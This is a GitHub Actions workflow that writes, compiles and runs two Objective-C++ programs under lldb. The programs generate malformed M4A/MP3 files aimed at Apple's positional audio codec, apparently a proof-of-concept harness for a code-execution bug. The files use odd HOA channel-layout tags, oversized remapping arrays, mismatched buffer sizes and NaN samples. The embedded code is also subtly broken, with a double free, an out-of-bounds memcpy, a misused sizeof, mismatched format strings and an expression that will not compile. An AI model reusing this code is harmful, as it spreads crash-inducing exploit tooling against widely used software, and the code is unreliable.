name: Fuzz Audio Files for Code Execution Testing

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-fuzz:
    runs-on: macos-latest
    timeout-minutes: 30

    steps:
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          ls -l
          echo "Repository cloned at $(date)"

      - name: Patch encodeme.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm at $(date)"
          cat > encodeme.mm << 'EOF'
          @import AVFAudio;
          @import AudioToolbox;
          #include <vector>
          #include <random>
          #include <stdio.h>

          struct CodecConfig {
            char padding0[0x78];
            AudioChannelLayout* remappingChannelLayout;
            char padding1[0xe0 - 0x80];
            std::vector<char> mRemappingArray;

            CodecConfig() : remappingChannelLayout(nullptr) {}
            ~CodecConfig() {
              if (remappingChannelLayout) {
                free(remappingChannelLayout);
              }
            }
          };

          void OverrideApac(CodecConfig* config) {
            if (config->remappingChannelLayout) {
              config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | (rand() % 0x10);
              fprintf(stderr, "Set channel layout tag to 0x%x\n", config->remappingChannelLayout->mChannelLayoutTag);
            }
            config->mRemappingArray.resize(1024 + (rand() % 1024), 0xff);
          }

          int main() {
            fprintf(stderr, "Starting encodeme at %s", ctime(&time(nullptr)));
            std::vector<double> sampleRates = {16000, 44100, 48000, 96000};
            std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> formatDist(0, formats.size() - 1);

            for (double sampleRate : sampleRates) {
              AudioFormatID formatID = formats[formatDist(gen)];
              fprintf(stderr, "Processing sample rate %.0f, format %u\n", sampleRate, formatID);
              if (formatID == kAudioFormatMPEG4AAC && sampleRate < 16000) {
                fprintf(stderr, "Skipping unsupported sample rate %.0f for AAC\n", sampleRate);
                continue;
              }
              uint32_t channelNum = 4 + (rand() % 8);
              AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
              if (!formatIn) {
                fprintf(stderr, "Failed to create AVAudioFormat for rate %.0f\n", sampleRate);
                continue;
              }

              AudioStreamBasicDescription outputDescription = {
                .mSampleRate = sampleRate,
                .mFormatID = formatID,
                .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : 0,
                .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : 1),
                .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
                .mChannelsPerFrame = channelNum,
                .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : 0),
                .mReserved = 0
              };

              AVAudioChannelLayout* channelLayout = [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3];
              if (!channelLayout || !channelLayout.layout) {
                fprintf(stderr, "Failed to create channel layout for rate %.0f\n", sampleRate);
                continue;
              }

              CodecConfig config;
              size_t layoutSize = sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * (channelNum + (rand() % 10));
              AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)calloc(1, layoutSize);
              if (!channelLayoutCopy) {
                fprintf(stderr, "Memory allocation failed for channel layout, rate %.0f\n", sampleRate);
                continue;
              }
              memcpy(channelLayoutCopy, channelLayout.layout, layoutSize);
              config.remappingChannelLayout = channelLayoutCopy;
              fprintf(stderr, "Allocated and copied channel layout for rate %.0f\n", sampleRate);

              OverrideApac(&config);

              NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.m4a", sampleRate, formatID];
              NSURL* outUrl = [NSURL fileURLWithPath:fileName];
              fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

              ExtAudioFileRef audioFile = nullptr;
              OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileM4AType,
                                                          &outputDescription, config.remappingChannelLayout,
                                                          kAudioFileFlags_EraseFile, &audioFile);
              if (status != noErr) {
                fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                free(channelLayoutCopy);
                continue;
              }

              NSDictionary *metadata = @{@"com.apple.metadata.spatial" : @(rand() % 0xFFFF)};
              AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(metadata), &metadata);

              status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                               sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
              if (status != noErr) {
                fprintf(stderr, "Error setting client data format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                ExtAudioFileDispose(audioFile);
                free(channelLayoutCopy);
                continue;
              }

              status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                               layoutSize, formatIn.channelLayout.layout);
              if (status != noErr) {
                fprintf(stderr, "Error setting client channel layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
                ExtAudioFileDispose(audioFile);
                free(channelLayoutCopy);
                continue;
              }

              float* audioBuffer = new float[44100 * channelNum];
              if (!audioBuffer) {
                fprintf(stderr, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
                ExtAudioFileDispose(audioFile);
                free(channelLayoutCopy);
                continue;
              }
              std::uniform_real_distribution<float> dis(-10.0f, 10.0f);
              for (size_t i = 0; i < 44100 * channelNum; ++i) {
                audioBuffer[i] = dis(gen);
                if (rand() % 100 < 10) {
                  audioBuffer[i] = std::numeric_limits<float>::infinity();
                }
              }
              fprintf(stderr, "Filled audio buffer for rate %.0f\n", sampleRate);

              AudioBufferList audioBufferList = {
                .mNumberBuffers = 1,
                .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000)), .mData = audioBuffer}},
              };
              status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);
              if (status != noErr) {
                fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }

              status = ExtAudioFileDispose(audioFile);
              if (status != noErr) {
                fprintf(stderr, "Error disposing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              }

              delete[] audioBuffer;
              free(channelLayoutCopy);
              fprintf(stderr, "Completed processing for rate %.0f\n", sampleRate);
            }
            fprintf(stderr, "encodeme completed at %s", ctime(&time(nullptr)));
            return 0;
          }
          EOF
          echo "encodeme.mm patched at $(date)"

      - name: Patch fuzzer.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching fuzzer.mm at $(date)"
          cat > fuzzer.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AVFAudio/AVFAudio.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <vector>
          #include <random>
          #include <stdio.h>
          #include <stdlib.h>
          #include <time.h>

          struct CodecConfig {
            char padding0[0x78];
            AudioChannelLayout* remappingChannelLayout;
            char padding1[0xe0 - 0x80];
            std::vector<char> mRemappingArray;

            CodecConfig() : remappingChannelLayout(nullptr) {}
            ~CodecConfig() {
              if (remappingChannelLayout) {
                free(remappingChannelLayout);
              }
            }
          };

          void OverrideApac(CodecConfig* config) {
            if (config->remappingChannelLayout) {
              config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | (rand() % 0x20);
              fprintf(stderr, "Fuzzer: Set channel layout tag to 0x%x\n", config->remappingChannelLayout->mChannelLayoutTag);
            }
            config->mRemappingArray.resize(2048 + (rand() % 2048), static_cast<char>(rand() % 256));
          }

          NSString* generateFuzzedAudio(NSString* inputPath, bool isMP3, FILE* logFile) {
            if (logFile) {
              time_t now = time(NULL);
              fprintf(logFile, "Fuzzing audio at %s", ctime(&now));
            }
            std::vector<double> sampleRates = {8000, 16000, 44100, 48000, 96000, 192000};
            std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM, kAudioFormatMPEG4AAC_HE};
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> formatDist(0, formats.size() - 1);
            std::uniform_int_distribution<> rateDist(0, sampleRates.size() - 1);
            std::uniform_real_distribution<float> volumeDis(-10.0f, 10.0f);
            std::uniform_int_distribution<> channelFuzz(1, 16);

            double sampleRate = sampleRates[rateDist(gen)];
            AudioFormatID formatID = formats[formatDist(gen)];
            uint32_t channelNum = channelFuzz(gen);

            if (logFile) {
              fprintf(logFile, "Params: sampleRate=%.0f, formatID=%u, channels=%u, isMP3=%d\n", 
                      sampleRate, formatID, channelNum, isMP3);
            }
            fprintf(stderr, "Fuzzing: sampleRate=%.0f, formatID=%u, channels=%u, isMP3=%d\n", 
                    sampleRate, formatID, channelNum, isMP3);

            AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
            if (!formatIn) {
              if (logFile) fprintf(logFile, "Failed AVAudioFormat for rate %.0f\n", sampleRate);
              fprintf(stderr, "Failed AVAudioFormat for rate %.0f\n", sampleRate);
              return nil;
            }

            AudioStreamBasicDescription outputDesc = {
              .mSampleRate = sampleRate,
              .mFormatID = formatID,
              .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : (rand() % 0xFF),
              .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : (rand() % 100),
              .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : (rand() % 2048)),
              .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : (rand() % 100),
              .mChannelsPerFrame = channelNum,
              .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : (rand() % 64)),
              .mReserved = rand()
            };

            AVAudioChannelLayout* channelLayout = [[AVAudioChannelLayout alloc] initWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | (rand() % 0x20)];
            if (!channelLayout || !channelLayout.layout) {
              if (logFile) fprintf(logFile, "Failed channel layout for rate %.0f\n", sampleRate);
              fprintf(stderr, "Failed channel layout for rate %.0f\n", sampleRate);
              return nil;
            }

            CodecConfig config;
            size_t layoutSize = sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * (channelNum + (rand() % 20));
            AudioChannelLayout* layoutCopy = (AudioChannelLayout*)calloc(1, layoutSize);
            if (!layoutCopy) {
              if (logFile) fprintf(logFile, "Memory allocation failed for rate %.0f\n", sampleRate);
              fprintf(stderr, "Memory allocation failed for rate %.0f\n", sampleRate);
              return nil;
            }
            memcpy(layoutCopy, channelLayout.layout, layoutSize);
            config.remappingChannelLayout = layoutCopy;
            fprintf(stderr, "Fuzzer: Loaded channel layout for rate %.0f\n", sampleRate);

            OverrideApac(&config);

            NSString* fileName = [NSString stringWithFormat:@"fuzzed_%.0f_%u_%u.%@", sampleRate, formatID, channelNum, isMP3 ? @"mp3" : @"m4a"];
            NSString* tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:fileName];
            NSURL* outUrl = [NSURL fileURLWithPath:tempPath];

            if (logFile) {
              fprintf(logFile, "Creating file: %s\n", tempPath.UTF8String);
            }
            fprintf(stderr, "Fuzzer: Generating file: %s\n", tempPath.UTF8String);

            ExtAudioFileRef audioFile = nullptr;
            OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl,
                                                       isMP3 ? kAudioFileMP3Type : kAudioFileM4AType,
                                                       &outputDesc, config.remappingChannelLayout,
                                                       kAudioFileFlags_EraseFile, &audioFile);
            if (status != noErr) {
              if (logFile) fprintf(logFile, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              fprintf(stderr, "Error creating file (rate %.0f, %.0f): %u\n", sampleRate, formatID, status);
              free(layoutCopy);
              return nil;
            }

            NSDictionary *metadata = @{
              @"com.apple.metadata.spatial" : @(rand() % 0xFFFF),
              @"channel_layout" : @(rand() % 0xFFFF)
            };
            AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(metadata), &metadata);

            status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                             sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
            if (status != noErr) {
              if (logFile) fprintf(logFile, "Error setting format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              fprintf(stderr, "Error setting format (rate %.0f, %.0f): %u\n", sampleRate, formatID, status);
              ExtAudioFileDispose(audioFile);
              free(layoutCopy);
              return nil;
            }

            status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                             layoutSize, formatIn.channelLayout.layout);
            if (status != noErr) {
              if (logFile) fprintf(logFile, "Error setting layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              fprintf(stderr, "Error setting layout (rate %.0f, %.0f): %u\n", sampleRate, formatID, status);
              ExtAudioFileDispose(audioFile);
              free(layoutCopy);
              return nil;
            }

            float* audioBuffer = new float[1024 * channelNum];
            if (!audioBuffer) {
              if (logFile) fprintf(logFile, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
              fprintf(stderr, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
              ExtAudioFileDispose(audioFile);
              free(layoutCopy);
              return nil;
            }
            std::uniform_real_distribution<float> dis(-100.0f, 100.0f);
            for (size_t i = 0; i < 1024 * channelNum; ++i) {
              audioBuffer[i] = dis(gen);
              if (rand() % 100 < 20) {
                audioBuffer[i] = (rand() % 2) ? std::numeric_limits<float>::infinity() : std::numeric_limits<float>::quiet_NaN();
              }
            }
            float volumeFactor = volumeDis(gen);
            for (size_t i = 0; i < 1024 * channelNum; ++i) {
              audioBuffer[i] *= volumeFactor;
            }
            fprintf(stderr, "Fuzzer: Filled audio buffer for rate %.0f\n", sampleRate);

            AudioBufferList bufferList = {
              .mNumberBuffers = 1 + (rand() % 3),
              .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(1024 * channelNum * sizeof(float) + (rand() % 2000)), .mData = audioBuffer}}
            };
            status = ExtAudioFileWrite(audioFile, 1024 + (rand() % 1000), &bufferList);
            if (status != noErr) {
              if (logFile) fprintf(logFile, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
              fprintf(stderr, "Error writing audio (rate %.0f, %.0f): %u\n", sampleRate, formatID, status);
            }

            ExtAudioFileDispose(audioFile);
            delete[] audioBuffer;
            free(layoutCopy);
            fprintf(stderr, "Fuzzer: Completed processing for rate %.0f\n", sampleRate);
            return tempPath;
          }

          int main(int argc, char *argv[]) {
            @autoreleasepool {
              FILE* logFile = fopen("fuzzer_detail.log", "a");
              if (logFile) {
                time_t now = time(NULL);
                fprintf(logFile, "Starting fuzzing at %s", ctime(&now));
              }

              NSString *inputPath = @"output_44100_1635013121.m4a";
              if (argc > 1) {
                inputPath = @(argv[1]);
                if (logFile) fprintf(logFile, "Input path: %s\n", inputPath.UTF8String);
              }

              int iterations = 20;
              if (argc > 2) {
                iterations = atoi(argv[2]);
                if (logFile) fprintf(logFile, "Iterations: %d\n", iterations);
              }

              for (int i = 0; i < iterations; i++) {
                if (logFile) fprintf(logFile, "Iteration %d/%d\n", i + 1, iterations);
                fprintf(stderr, "Fuzzer: Iteration %d/%d\n", i + 1, iterations);

                NSString *tempPathM4A = generateFuzzedAudio(inputPath, false, logFile);
                NSString *tempPathMP3 = generateFuzzedAudio(inputPath, true, logFile);

                if (logFile) fprintf(logFile, "Completed iteration %d\n", i + 1);
              }

              if (logFile) {
                time_t now = time(NULL);
                fprintf(logFile, "Fuzzing completed at %s", ctime(&now));
                fclose(logFile);
              }
              fprintf(stderr, "Fuzzing completed\n");
            }
            return 0;
          }
          EOF
          echo "fuzzer.mm patched at $(date)"

      - name: Cache FFmpeg
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/ffmpeg
          key: ffmpeg-${{ runner.os }}-2025-06
          restore-keys: ffmpeg-${{ runner.os }}-

      - name: Install FFmpeg
        run: |
          echo "Installing FFmpeg at $(date)"
          if ! command -v ffmpeg &> /dev/null; then
            brew install ffmpeg
          else
            echo "FFmpeg already installed"
            ffmpeg -version
          fi

      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1'

      - name: Verify Xcode and clang version
        run: |
          echo "Verifying Xcode and clang versions at $(date)"
          xcodebuild -version
          clang++ --version
          xcrun --show-sdk-path
          echo "Verification completed at $(date)"
        env:
          MD_APPLE_SDK_ROOT: /Applications/Xcode_16.1.app

      - name: Verify source files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking files at $(date)"
          for file in encodeme.mm fuzzer.mm; do
            if [ -f "$file" ] && [ -r "$file" ]; then
              echo "$file found and readable"
              ls -l "$file"
            else
              echo "Error: $file not found or not readable"
              ls -l
              exit 1
            fi
          done

      - name: Compile encodeme
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm at $(date)"
          if [ ! -f encodeme.mm ]; then
            echo "Error: encodeme.mm not found"
            ls -l
            exit 1
          fi
          echo "encodeme.mm found, proceeding with compilation"
          clang++ -g -Os -std=c++11 -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot "$(xcrun --show-sdk-path)" -framework AVFAudio -framework AudioToolbox encodeme.mm -o encodeme 2> encodeme_compile.log
          EXIT_STATUS=$?
          if [ $EXIT_STATUS -eq 0 ]; then
            echo "Compilation succeeded"
            ls -l encodeme
          else
            echo "Compilation failed with exit code $EXIT_STATUS"
            echo "Contents of encodeme_compile.log:"
            cat encodeme_compile.log
            echo "Listing directory for debugging:"
            ls -l
            exit 1
          fi
        env:
          MD_APPLE_SDK_ROOT: /Applications/Xcode_16.1.app

      - name: Compile fuzzer
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling fuzzer.mm at $(date)"
          if [ ! -f fuzzer.mm ]; then
            echo "Error: fuzzer.mm not found"
            ls -l
            exit 1
          fi
          echo "fuzzer.mm found, proceeding with compilation"
          clang++ -g -Os -std=c++11 -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot "$(xcrun --show-sdk-path)" -framework AVFAudio -framework AudioToolbox -framework Foundation fuzzer.mm -o fuzzer 2> fuzzer_compile.log
          EXIT_STATUS=$?
          if [ $EXIT_STATUS -eq 0 ]; then
            echo "Compilation succeeded"
            ls -l fuzzer
          else
            echo "Compilation failed with exit code $EXIT_STATUS"
            echo "Contents of fuzzer_compile.log:"
            cat fuzzer_compile.log
            echo "Listing directory for debugging:"
            ls -l
            exit 1
          fi
        env:
          MD_APPLE_SDK_ROOT: /Applications/Xcode_16.1.app

      - name: Run encodeme with lldb
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Running encodeme with lldb at $(date)"
          chmod +x encodeme
          echo "run" > lldb_commands.txt
          echo "bt" >> lldb_commands.txt
          echo "register read" >> lldb_commands.txt
          echo "memory read \$arg0" >> lldb_commands.txt
          echo "exit" >> lldb_commands.txt
          lldb --batch -f ./encodeme -s lldb_commands.txt > encodeme_lldb.log 2>&1
          EXIT_STATUS=$?
          if [ $EXIT_STATUS -eq 0 ]; then
            echo "encodeme executed successfully"
            ls -l output_*.m4a || echo "No output files found"
          else
            echo "encodeme failed with exit code $EXIT_STATUS"
            cat encodeme_lldb.log
            log show --predicate 'eventMessage contains "encodeme" && processImagePath contains "encodeme"' --last 5m > encodeme_system.log 2>&1
            cat encodeme_system.log
            exit 1
          fi

      - name: Run fuzzer with lldb
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Running fuzzer with lldb at $(date)"
          chmod +x fuzzer
          echo "run" > lldb_fuzzer_commands.txt
          echo "bt" >> lldb_fuzzer_commands.txt
          echo "register read" >> lldb_fuzzer_commands.txt
          echo "memory read \$arg0" >> lldb_fuzzer_commands.txt
          echo "exit" >> lldb_fuzzer_commands.txt
          for file in output_*.m4a; do
            if [ -f "$file" ]; then
              lldb --batch -f ./fuzzer -s lldb_fuzzer_commands.txt -- "$file" 20 > lldb_fuzzer_$(basename "$file" .m4a).log 2>&1
              if [ $? -eq 0 ]; then
                echo "Fuzzer succeeded for $file"
                ls -l fuzzed_*.{m4a,mp3}
              else
                echo "Fuzzer failed for $file"
                cat lldb_fuzzer_$(basename "$file" .m4a).log
                log show --predicate 'eventMessage contains "fuzzer" && processImagePath contains "fuzzer"' --last 5m > fuzzer_system_$(basename "$file" .m4a).log 2>&1
                cat fuzzer_system_$(basename "$file" .m4a).log
                exit 1
              fi
            fi
          done

      - name: Convert M4A to MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Converting .m4a to .mp3 at $(date)"
          for file in output_*.m4a; do
            if [ -f "$file" ]; then
              mp3_file="${file%.m4a}.mp3"
              ffmpeg -i "$file" -c:a mp3 -b:a 128k -ac 4 "$mp3_file" 2>&1
              if [ $? -eq 0 ]; then
                echo "Converted $file to $mp3_file"
              else
                echo "Conversion failed for $file"
                exit 1
              fi
            fi
          done

      - name: Verify generated files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Verifying files at $(date)"
          for file in output_*.{m4a,mp3} fuzzed_*.{m4a,mp3}; do
            if [ -f "$file" ]; then
              FILE_SIZE=$(stat -f %z "$file")
              echo "$file size: $FILE_SIZE bytes"
              if [ "$FILE_SIZE" -eq 0 ]; then
                echo "Error: $file is empty"
                exit 1
              fi
              ffprobe "$file" -show_format -show_streams -print_format json 2> ffprobe_$(basename "$file").log
              if [ $? -ne 0 ]; then
                echo "Warning: ffprobe failed for $file"
                cat ffprobe_$(basename "$file").log
              fi
            fi
          done

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: fuzz-results
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzed_*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/fuzzed_*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/*.log
          retention-days: 7
          if-no-files-found: warn
